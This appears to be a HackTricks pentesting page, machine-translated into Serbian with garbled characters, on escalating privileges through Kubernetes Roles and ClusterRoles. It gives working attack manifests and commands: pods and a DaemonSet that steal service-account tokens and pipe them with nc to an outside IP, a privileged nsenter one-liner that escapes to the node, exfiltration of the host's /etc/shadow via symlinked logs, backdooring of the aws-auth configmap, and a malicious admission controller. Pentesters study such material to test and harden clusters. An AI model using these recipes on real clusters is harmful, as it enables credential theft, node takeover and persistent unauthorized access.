# Abusing Roles/ClusterRoles in Kubernetes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Ovde moÅ¾ete pronaÄ‡i neke potencijalno opasne konfiguracije Roles i ClusterRoles.\
Zapamtite da moÅ¾ete dobiti sve podrÅ¾ane resurse sa `kubectl api-resources`

## **Privilege Escalation**

Odnosi se na veÅ¡tinu dobijanja **pristupa razliÄitom principalu** unutar klastera **sa razliÄitim privilegijama** (unutar kubernetes klastera ili na eksternim cloud-ovima) od onih koje veÄ‡ imate, u Kubernetes-u postoje osnovno **4 glavne tehnike za eskalaciju privilegija**:

* MoÅ¾ete **imituju** druge korisnike/grupe/SAs sa boljim privilegijama unutar kubernetes klastera ili na eksternim cloud-ovima
* MoÅ¾ete **kreirati/patch/exec pods** gde moÅ¾ete **pronaÄ‡i ili prikljuÄiti SAs** sa boljim privilegijama unutar kubernetes klastera ili na eksternim cloud-ovima
* MoÅ¾ete **Äitati tajne** jer su SAs tokeni pohranjeni kao tajne
* MoÅ¾ete **pobeÄ‡i na Ävor** iz kontejnera, gde moÅ¾ete ukrasti sve tajne kontejnera koji se izvrÅ¡avaju na Ävoru, kredencijale Ävora i dozvole Ävora unutar clouda u kojem se izvrÅ¡ava (ako ih ima)
* Peta tehnika koja zasluÅ¾uje pominjanje je sposobnost da **pokrenete port-forward** u podu, jer moÅ¾da moÅ¾ete pristupiti zanimljivim resursima unutar tog poda.

### Access Any Resource or Verb (Wildcard)

**wildcard (\*) daje dozvolu za bilo koji resurs sa bilo kojim glagolom**. Koriste ga administratori. Unutar ClusterRole to znaÄi da bi napadaÄ mogao zloupotrebiti bilo koji namespace u klasteru.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### Pristup bilo kojem resursu sa specifiÄnom akcijom

U RBAC-u, odreÄ‘ene dozvole predstavljaju znaÄajne rizike:

1. **`create`:** Daje moguÄ‡nost kreiranja bilo kog klasterskog resursa, Å¡to moÅ¾e dovesti do eskalacije privilegija.
2. **`list`:** OmoguÄ‡ava listanje svih resursa, potencijalno otkrivajuÄ‡i osetljive podatke.
3. **`get`:** Dozvoljava pristup tajnama iz servisnih naloga, Å¡to predstavlja bezbednosnu pretnju.
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - Steal Token

NapadaÄ sa dozvolama za kreiranje poda moÅ¾e da prikaÄi privilegovani servisni nalog u pod i ukrade token da bi se pretvarao da je taj servisni nalog. Efektivno poveÄ‡avajuÄ‡i privilegije.

Primer poda koji Ä‡e ukrasti token servisnog naloga `bootstrap-signer` i poslati ga napadaÄu:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Pod Create & Escape

SledeÄ‡e ukazuje na sve privilegije koje kontejner moÅ¾e imati:

* **Privilegovan pristup** (onemoguÄ‡avanje zaÅ¡tita i postavljanje sposobnosti)
* **OnemoguÄ‡avanje namespaces hostIPC i hostPid** koji mogu pomoÄ‡i u eskalaciji privilegija
* **OnemoguÄ‡avanje hostNetwork** namespace-a, dajuÄ‡i pristup za kraÄ‘u privilegija Ävora u oblaku i bolji pristup mreÅ¾ama
* **Montiranje hostova / unutar kontejnera**

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

Kreirajte pod sa:
```bash
kubectl --token $token create -f mount_root.yaml
```
Jednolinijska komanda iz [ovog tvita](https://twitter.com/mauilion/status/1129468485480751104) i sa nekim dodacima:
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
Sada kada moÅ¾ete da pobegnete na Ävor, proverite tehnike post-eksploatacije u:

#### Stealth

Verovatno Å¾elite da budete **diskretniji**, na sledeÄ‡im stranicama moÅ¾ete videti Å¡ta biste mogli da pristupite ako kreirate pod omoguÄ‡avajuÄ‡i samo neka od pomenutih privilegija u prethodnom Å¡ablonu:

* **Privileged + hostPID**
* **Privileged only**
* **hostPath**
* **hostPID**
* **hostNetwork**
* **hostIPC**

_MoÅ¾ete pronaÄ‡i primer kako da kreirate/iskoristite prethodne privilegovane konfiguracije podova u_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods)

### Pod Create - Move to cloud

Ako moÅ¾ete da **kreirate** **pod** (i opcionalno **service account**) moÅ¾da Ä‡ete moÄ‡i da **dobijete privilegije u cloud okruÅ¾enju** dodeljujuÄ‡i **cloud roles** podu ili **service account** i zatim mu pristupiti.\
Å taviÅ¡e, ako moÅ¾ete da kreirate **pod sa host network namespace** moÅ¾ete **ukrasti IAM** ulogu **node** instance.

Za viÅ¡e informacija proverite:

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **Create/Patch Deployment, Daemonsets, Statefulsets, Replicationcontrollers, Replicasets, Jobs and Cronjobs**

MoguÄ‡e je iskoristiti ove dozvole da **kreirate novi pod** i uspostavite privilegije kao u prethodnom primeru.

SledeÄ‡i yaml **kreira daemonset i exfiltrira token SA** unutar poda:
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`** je resurs u kubernetes-u koji se koristi za **izvrÅ¡avanje komandi u shell-u unutar poda**. Ovo omoguÄ‡ava **izvrÅ¡avanje komandi unutar kontejnera ili dobijanje shell-a unutar**.

Stoga, moguÄ‡e je **uÄ‡i u pod i ukrasti token SA**, ili uÄ‡i u privilegovani pod, pobjeÄ‡i na Ävor i ukrasti sve tokene podova na Ävoru i (zlo)upotrebiti Ävor:
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### port-forward

Ova dozvola omoguÄ‡ava **prosleÄ‘ivanje jednog lokalnog porta na jedan port u specificiranom podu**. Ovo je namenjeno da se olakÅ¡a debagovanje aplikacija koje se izvrÅ¡avaju unutar poda, ali napadaÄ bi to mogao zloupotrebiti da dobije pristup zanimljivim (kao Å¡to su DB-ovi) ili ranjivim aplikacijama (web?) unutar poda:
```
kubectl port-forward pod/mypod 5000:5000
```
### Hosts Writable /var/log/ Escape

Kao [**Å¡to je naznaÄeno u ovom istraÅ¾ivanju**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), ako moÅ¾ete pristupiti ili kreirati pod sa **montiranim `/var/log/` direktorijumom** na njemu, moÅ¾ete **pobeÄ‡i iz kontejnera**.\
To je u suÅ¡tini zato Å¡to kada **Kube-API pokuÅ¡ava da dobije logove** kontejnera (koristeÄ‡i `kubectl logs <pod>`), **zahteva `0.log`** datoteku pod-a koristeÄ‡i `/logs/` endpoint **Kubelet** servisa.\
Kubelet servis izlaÅ¾e `/logs/` endpoint koji u suÅ¡tini **izlaÅ¾e `/var/log` datoteÄni sistem kontejnera**.

Stoga, napadaÄ sa **pristupom za pisanje u /var/log/ folder** kontejnera mogao bi da zloupotrebi ovo ponaÅ¡anje na 2 naÄina:

* Modifikovanjem `0.log` datoteke svog kontejnera (obiÄno se nalazi u `/var/logs/pods/namespace_pod_uid/container/0.log`) da bude **simboliÄka veza koja pokazuje na `/etc/shadow`** na primer. Tada Ä‡ete moÄ‡i da exfiltrirate hosts shadow datoteku radeÄ‡i:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* Ako napadaÄ kontroliÅ¡e bilo koji princip sa **dozvolama za Äitanje `nodes/log`**, moÅ¾e jednostavno da kreira **symlink** u `/host-mounted/var/log/sym` ka `/` i kada **pristupi `https://<gateway>:10250/logs/sym/` prikazaÄ‡e korenski** fajl sistem hosta (promena symlinka moÅ¾e omoguÄ‡iti pristup fajlovima).
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**Laboratorija i automatski exploit mogu se naÄ‡i na** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts)

#### ObilaÅ¾enje readOnly zaÅ¡tite <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Ako imate sreÄ‡e i visoko privilegovana sposobnost `CAP_SYS_ADMIN` je dostupna, moÅ¾ete jednostavno ponovo montirati folder kao rw:
```bash
mount -o rw,remount /hostlogs/
```
#### Bypassing hostPath readOnly protection <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

Kao Å¡to je navedeno u [**ovoj studiji**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html), moguÄ‡e je zaobiÄ‡i zaÅ¡titu:
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
Koji je bio zamiÅ¡ljen da spreÄi eskape poput prethodnih, tako Å¡to umesto koriÅ¡Ä‡enja hostPath montaÅ¾e, koristi PersistentVolume i PersistentVolumeClaim za montiranje foldera domaÄ‡ina u kontejner sa pristupom za pisanje:
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **Imitiranje privilegovanih naloga**

Sa [**privilegijom imitacije korisnika**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation), napadaÄ moÅ¾e imitirati privilegovan nalog.

Jednostavno koristite parametar `--as=<username>` u `kubectl` komandi da biste imitirali korisnika, ili `--as-group=<group>` da biste imitirali grupu:
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
Ili koristite REST API:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### Listing Secrets

Dozvola za **listanje tajni moÅ¾e omoguÄ‡iti napadaÄu da zapravo proÄita tajne** pristupajuÄ‡i REST API kraju:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ÄŒitanje tajne â€“ brute-forcing ID-ova tokena

Dok napadaÄ u posedu tokena sa pravima za Äitanje zahteva taÄno ime tajne da bi je koristio, za razliku od Å¡ireg privilegija _**listing secrets**_, i dalje postoje ranjivosti. Podrazumevani servisni nalozi u sistemu mogu se enumerisati, svaki povezan sa tajnom. Ove tajne imaju strukturu imena: statiÄki prefiks praÄ‡en nasumiÄnim alfanumeriÄkim tokenom od pet karaktera (izuzimajuÄ‡i odreÄ‘ene karaktere) prema [izvornom kodu](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83).

Token se generiÅ¡e iz ograniÄenog skupa od 27 karaktera (`bcdfghjklmnpqrstvwxz2456789`), umesto iz celog alfanumeriÄkog opsega. Ova ograniÄenja smanjuju ukupan broj moguÄ‡ih kombinacija na 14,348,907 (27^5). Kao rezultat, napadaÄ bi mogao izvesti brute-force napad da bi dedukovao token za nekoliko sati, Å¡to bi potencijalno dovelo do eskalacije privilegija pristupom osetljivim servisnim nalozima.

### Zahtevi za potpisivanje sertifikata

Ako imate glagole **`create`** u resursu `certificatesigningrequests` (ili barem u `certificatesigningrequests/nodeClient`). MoÅ¾ete **napraviti** novi CeSR za **novi Ävor.**

Prema [dokumentaciji, moguÄ‡e je automatski odobriti ove zahteve](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/), tako da u tom sluÄaju **ne trebate dodatne dozvole**. Ako ne, morali biste biti u moguÄ‡nosti da odobrite zahtev, Å¡to znaÄi aÅ¾uriranje u `certificatesigningrequests/approval` i `approve` u `signers` sa resourceName `<signerNameDomain>/<signerNamePath>` ili `<signerNameDomain>/*`

**Primer uloge** sa svim potrebnim dozvolama je:
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
Dakle, sa odobrenim novim CSR-om Ävora, moÅ¾ete **iskoristiti** posebne dozvole Ävorova da **ukradete tajne** i **poveÄ‡ate privilegije**.

U [**ovom postu**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) i [**ovom**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) GKE K8s TLS Bootstrap konfiguracija je podeÅ¡ena sa **automatskim potpisivanjem** i koristi se za generisanje kredencijala novog K8s Ävora, a zatim se ti kredencijali koriste za poveÄ‡anje privilegija ukradanjem tajni.\
Ako **imate pomenute privilegije, mogli biste uraditi istu stvar**. Imajte na umu da prvi primer zaobilazi greÅ¡ku koja spreÄava novi Ävor da pristupi tajnama unutar kontejnera jer **Ävor moÅ¾e pristupiti samo tajnama kontejnera koji su montirani na njemu.**

NaÄin da se to zaobiÄ‘e je jednostavno **napraviti kredencijale Ävora za ime Ävora gde je kontejner sa zanimljivim tajnama montiran** (ali samo proverite kako to uraditi u prvom postu):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

Principali koji mogu da modifikuju **`configmaps`** u kube-system imenskom prostoru na EKS (moraju biti u AWS) klasterima mogu dobiti privilegije klaster admina prepisivanjem **aws-auth** configmap-a.\
Potrebni glagoli su **`update`** i **`patch`**, ili **`create`** ako configmap nije kreiran:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
MoÅ¾ete koristiti **`aws-auth`** za **persistence** dajuÄ‡i pristup korisnicima iz **drugih naloga**.

MeÄ‘utim, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **ne funkcioniÅ¡e iz drugog naloga**. Ali zapravo `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` funkcioniÅ¡e ako stavite ARN klastera umesto samo imena.\
Da bi `kubectl` radio, samo se pobrinite da **konfiguriÅ¡ete** **kubeconfig Å¾rtve** i u aws exec args dodajte `--profile other_account_role` tako da kubectl koristi profil drugog naloga za dobijanje tokena i kontaktiranje AWS-a.
{% endhint %}

### Eskalacija u GKE

Postoje **2 naÄina da se dodele K8s dozvole GCP principima**. U svakom sluÄaju, princip takoÄ‘e treba dozvolu **`container.clusters.get`** da bi mogao da prikupi akreditive za pristup klasteru, ili Ä‡ete morati da **generiÅ¡ete svoj vlastiti kubectl config fajl** (pratite sledeÄ‡i link).

{% hint style="warning" %}
Kada komunicirate sa K8s api krajnjom taÄkom, **GCP auth token Ä‡e biti poslat**. Tada Ä‡e GCP, preko K8s api krajnje taÄke, prvo **proveriti da li princip** (prema emailu) **ima bilo kakav pristup unutar klastera**, zatim Ä‡e proveriti da li ima **bilo kakav pristup putem GCP IAM**.\
Ako je **bilo koja** od ovih **taÄna**, biÄ‡e mu **odgovoreno**. Ako **nije**, biÄ‡e data **greÅ¡ka** koja sugeriÅ¡e da se **dozvole dodele putem GCP IAM**.
{% endhint %}

Prvi metod je koriÅ¡Ä‡enje **GCP IAM**, K8s dozvole imaju svoje **ekvivalentne GCP IAM dozvole**, i ako princip to ima, moÄ‡i Ä‡e da ga koristi.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Drugi metod je **dodeljivanje K8s dozvola unutar klastera** identifikovanjem korisnika prema njegovom **emailu** (ukljuÄujuÄ‡i GCP servisne naloge).

### Kreiranje tokena za servisne naloge

Principi koji mogu **kreirati TokenRequests** (`serviceaccounts/token`) kada komuniciraju sa K8s api krajnjom taÄkom SAs (informacije iz [**ovde**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)).

### ephemeralcontainers

Principi koji mogu **`update`** ili **`patch`** **`pods/ephemeralcontainers`** mogu dobiti **izvrÅ¡avanje koda na drugim podovima**, i potencijalno **pobeÄ‡i** na njihov Ävor dodavanjem ephemeral kontejnera sa privilegovanim securityContext.

### ValidatingWebhookConfigurations ili MutatingWebhookConfigurations

Principi sa bilo kojim od glagola `create`, `update` ili `patch` nad `validatingwebhookconfigurations` ili `mutatingwebhookconfigurations` mogli bi biti u moguÄ‡nosti da **kreiraju jednu od takvih webhook konfiguracija** kako bi mogli da **eskaliraju privilegije**.

Za [`mutatingwebhookconfigurations` primer proverite ovu sekciju ovog posta](./#malicious-admission-controller).

### Eskaliraj

Kao Å¡to moÅ¾ete proÄitati u sledeÄ‡oj sekciji: [**UgraÄ‘ena prevencija eskalacije privilegija**](./#built-in-privileged-escalation-prevention), princip ne moÅ¾e aÅ¾urirati niti kreirati uloge ili clusterrole bez da sam ima te nove dozvole. Osim ako ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**.\
Tada moÅ¾e aÅ¾urirati/kreati nove uloge, clusterrole sa boljim dozvolama od onih koje ima.

### Nodes proxy

Principi sa pristupom do **`nodes/proxy`** podresursa mogu **izvrÅ¡avati kod na podovima** putem Kubelet API (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)). ViÅ¡e informacija o Kubelet autentifikaciji na ovoj stranici:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

Imate primer kako dobiti [**RCE razgovarajuÄ‡i autorizovano sa Kubelet API ovde**](../pentesting-kubernetes-services/#kubelet-rce).

### Brisanje podova + neschedule-ovani Ävorovi

Principi koji mogu **brisati podove** (`delete` glagol nad `pods` resursom), ili **izbaciti podove** (`create` glagol nad `pods/eviction` resursom), ili **promeniti status poda** (pristup `pods/status`) i mogu **uÄiniti druge Ävorove neschedule-ovanim** (pristup `nodes/status`) ili **brisati Ävorove** (`delete` glagol nad `nodes` resursom) i imaju kontrolu nad podom, mogli bi **ukrasti podove sa drugih Ävorova** tako da se **izvrÅ¡avaju** na **kompromitovanom** **Ävoru** i napadaÄ moÅ¾e **ukrasti tokene** iz tih podova.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### Status usluga (CVE-2020-8554)

Principali koji mogu **modifikovati** **`services/status`** mogu postaviti polje `status.loadBalancer.ingress.ip` da iskoriste **neispravljeni CVE-2020-8554** i pokrenu **MiTM napade protiv klastera**. VeÄ‡ina mera za ublaÅ¾avanje CVE-2020-8554 samo spreÄava ExternalIP usluge (prema [**ovome**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### Status Ävorova i podova

Principali sa **`update`** ili **`patch`** dozvolama nad `nodes/status` ili `pods/status`, mogli bi modifikovati oznake kako bi uticali na primenjene ograniÄenja rasporeÄ‘ivanja.

## UgraÄ‘ena prevencija eskalacije privilegija

Kubernetes ima [ugraÄ‘eni mehanizam](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) za spreÄavanje eskalacije privilegija.

Ovaj sistem osigurava da **korisnici ne mogu poveÄ‡ati svoje privilegije modifikovanjem uloga ili veza uloga**. SprovoÄ‘enje ovog pravila se deÅ¡ava na API nivou, pruÅ¾ajuÄ‡i zaÅ¡titu Äak i kada je RBAC autorizator neaktivan.

Pravilo stipulira da **korisnik moÅ¾e kreirati ili aÅ¾urirati ulogu samo ako poseduje sve dozvole koje uloga obuhvata**. Å taviÅ¡e, opseg postojeÄ‡ih dozvola korisnika mora se poklapati sa onim uloge koju pokuÅ¡ava da kreira ili modifikuje: ili na nivou klastera za ClusterRoles ili ograniÄeno na istu namespace (ili na nivou klastera) za Roles.

{% hint style="warning" %}
Postoji izuzetak od prethodnog pravila. Ako neki principal ima **glagol `escalate`** nad **`roles`** ili **`clusterroles`**, moÅ¾e poveÄ‡ati privilegije uloga i clusterroles Äak i bez da ih sam poseduje.
{% endhint %}

### **Preuzmi & Patch RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**OÄigledno je da je ova tehnika ranije radila, ali prema mojim testovima viÅ¡e ne funkcioniÅ¡e iz istog razloga objaÅ¡njenog u prethodnom odeljku. Ne moÅ¾ete kreirati/modifikovati rolebinding da biste sebi ili drugom SA dali neke privilegije ako ih veÄ‡ nemate.**
{% endhint %}

Privilegija za kreiranje Rolebindings omoguÄ‡ava korisniku da **veÅ¾e uloge za servisni nalog**. Ova privilegija moÅ¾e potencijalno dovesti do eskalacije privilegija jer **omoguÄ‡ava korisniku da veÅ¾e administratorske privilegije za kompromitovani servisni nalog.**

## Drugi napadi

### Sidecar proxy aplikacija

Po defaultu, ne postoji nikakva enkripcija u komunikaciji izmeÄ‘u podova. Uzajamna autentifikacija, dvosmerna, pod do poda.

#### Kreirajte sidecar proxy aplikaciju <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Kreirajte svoj .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Izmenite svoj .yaml i dodajte nekomentarisane linije:
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Pogledajte logove proksija:
```bash
kubectl logs app -C proxy
```
ViÅ¡e informacija na: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Zlonameran Admission Controller

Admission controller **presreÄ‡e zahteve ka Kubernetes API serveru** pre nego Å¡to doÄ‘e do trajanja objekta, ali **nakon Å¡to je zahtev autentifikovan** **i autorizovan**.

Ako napadaÄ nekako uspe da **ubaci Mutationg Admission Controller**, moÄ‡i Ä‡e da **modifikuje veÄ‡ autentifikovane zahteve**. To moÅ¾e potencijalno omoguÄ‡iti privesc, i obiÄno omoguÄ‡iti trajanje u klasteru.

**Primer sa** [**https://blog.rewanthtammana.com/creating-malicious-admission-controllers**](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Proverite status da vidite da li je spremno:
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Zatim implementirajte novi pod:
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Kada vidite greÅ¡ku `ErrImagePull`, proverite ime slike sa bilo kojim od upita:
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Kao Å¡to moÅ¾ete videti na gornjoj slici, pokuÅ¡ali smo da pokrenemo sliku `nginx`, ali je konaÄno izvrÅ¡ena slika `rewanthtammana/malicious-image`. Å ta se upravo desilo!!?

#### TehniÄki detalji <a href="#heading-technicalities" id="heading-technicalities"></a>

